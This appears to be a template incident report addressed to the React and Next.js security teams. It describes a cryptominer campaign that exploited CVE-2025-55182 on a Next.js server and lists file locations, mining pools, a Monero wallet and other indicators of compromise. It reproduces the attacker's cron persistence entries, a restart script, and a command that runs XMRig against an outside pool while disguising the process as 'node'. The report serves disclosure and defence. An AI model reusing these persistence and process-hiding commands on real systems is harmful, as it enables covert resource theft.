# Security Report: Cryptominer Campaign Exploiting CVE-2025-55182

## Email to: security@meta.com & security@vercel.com

---

**Subject:** Cryptominer Malware Campaign Actively Exploiting CVE-2025-55182 (React2Shell) - Threat Intelligence Report

---

Dear Security Team,

I am writing to report detailed threat intelligence regarding an active cryptominer campaign that exploited CVE-2025-55182 (React2Shell) on my server. This information may help you track the threat actors and protect other users.

## Incident Summary

My VPS running React 19.2.0 and Next.js 16.0.7 was compromised on **December 5, 2025** - the same day mass exploitation began. The attacker deployed multiple cryptominers using the RCE vulnerability.

## Malware Details

### 1. Primary Miner

| Attribute | Value |
|-----------|-------|
| Location | `/home/ubuntu/.config/.system-monitor/.sys-mon` |
| Created | December 5, 2025 04:50 UTC |
| Size | 14,487,552 bytes |
| Type | XMRig (Monero Miner) |

### 2. Secondary Miner Kit

| Attribute | Value |
|-----------|-------|
| Location | `/home/ubuntu/.../.x/` |
| Created | December 8-11, 2025 |
| Mining Pool | `204.93.253.180:80` |
| Note | Folder named `...` (three dots) for obfuscation |

**Contents of malware kit:**
```
/home/ubuntu/.../.x/
├── stak/xmrig    # Miner executable
├── upd           # Persistence script
├── run           # Launcher script
├── bash          # Secondary launcher
├── h64           # Process hider (disguises process name as "node")
├── bash.pid      # PID tracking file
└── cron.d        # Cron configuration
```

### 3. Tertiary Miner

| Attribute | Value |
|-----------|-------|
| Location | `/tmp/runnv/runnv` |
| Created | December 9, 2025 06:16 UTC |
| Size | 8,334,576 bytes |
| Mining Pool | `flarepulsar.top:9201` |
| Backup Pool | `154.89.152.19:9201` |

## Attacker's Wallet Address (Monero)

```
49Qp2aEzUdEANd88muJEvDVKEzn9xbm5xEXjZ8QUeN1ndVxvtUuSjZAecFJHabrzYE2VXTu5sZM8H5GiKfKah1VJBwuWhYc
```

## Mining Pool Infrastructure

| Pool | IP/Domain | Port |
|------|-----------|------|
| Primary | `flarepulsar.top` | 9201 |
| Secondary | `154.89.152.19` | 9201 |
| Tertiary | `204.93.253.180` | 80 |

## Persistence Mechanism

The attacker established persistence via cron jobs:

```bash
* * * * * /home/ubuntu/.../.x/upd >/dev/null 2>&1    # Runs every minute
@reboot /home/ubuntu/.../.x/upd >/dev/null 2>&1      # Runs on boot
```

The `upd` script checks if the miner is running and restarts it if killed:

```bash
#!/bin/sh
if test -r /home/ubuntu/.../.x/bash.pid; then
    pid=$(cat /home/ubuntu/.../.x/bash.pid)
    if $(kill -CHLD $pid >/dev/null 2>&1); then
        sleep 1
    else
        cd /home/ubuntu/.../.x
        ./run &>/dev/null
        exit 0
    fi
fi
```

## Process Hiding Technique

The malware uses `h64` binary to disguise the miner process as "node":

```bash
./h64 -s node ./stak/ld-linux-x86-64.so.2 --library-path stak stak/xmrig -o 204.93.253.180:80 -k
```

## Timeline

| Date | Event |
|------|-------|
| Dec 3, 2025 | CVE-2025-55182 publicly disclosed |
| Dec 5, 2025 | Mass exploitation begins (per Wiz Research) |
| Dec 5, 2025 04:50 UTC | First miner deployed on my server |
| Dec 8, 2025 | Secondary miner kit deployed |
| Dec 9, 2025 | Third miner deployed |
| Dec 17, 2025 | Malware discovered and removed |

## Affected System Configuration

| Component | Version |
|-----------|---------|
| React | 19.2.0 (vulnerable) |
| Next.js | 16.0.7 (vulnerable) |
| Node.js | 18.19.1 |
| OS | Ubuntu Linux (ARM64) |
| Hosting | Oracle Cloud VPS |

## Indicators of Compromise (IOCs)

### File Hashes (if needed, I can provide)
- `/home/ubuntu/.config/.system-monitor/.sys-mon`
- `/tmp/runnv/runnv`
- `/home/ubuntu/.../.x/stak/xmrig`

### Network IOCs
- `flarepulsar.top:9201`
- `154.89.152.19:9201`
- `204.93.253.180:80`

### File System IOCs
- `/home/ubuntu/.config/.system-monitor/`
- `/home/ubuntu/.../` (three dots directory)
- `/tmp/runnv/`

## Recommendations

1. **Alert users** about this active cryptominer campaign
2. **Blocklist** the mining pools and wallet address
3. **Share IOCs** with security community
4. **Coordinate** with hosting providers to scan for these indicators

## Additional Notes

I have documented this incident publicly to warn other developers:
- GitHub: https://github.com/zesbe/Readme

I am happy to provide additional information, file samples, or logs if needed for your investigation.

Thank you for your attention to this matter.

Best regards,

[Your Name]
[Your Email]
[Your Organization - if applicable]

---

## How to Send

1. Copy the content above
2. Send to **both**:
   - security@meta.com (React team)
   - security@vercel.com (Next.js team)
3. Attach any malware samples if you saved them
4. Consider also reporting to:
   - CERT (https://www.cisa.gov/report)
   - Abuse contacts for the mining pool IPs
